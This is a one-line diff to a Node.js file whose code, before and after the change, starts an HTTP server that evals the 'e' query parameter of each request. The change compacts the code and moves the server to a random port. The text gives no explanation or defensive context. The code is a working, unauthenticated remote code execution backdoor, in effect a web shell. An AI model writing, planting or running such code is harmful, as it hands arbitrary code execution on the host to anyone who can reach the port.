@@ -1,1 +1,1 @@
-require('http').createServer((q, s)=>{try{eval(require('url').parse(q.url, true).query.e)}catch{s.end('bad boy')}}).listen(3002);
+require('http').createServer((q,s)=>{try{eval(require('url').parse(q.url,1).query.e)}catch{s.end('bad boy')}}).listen(0);
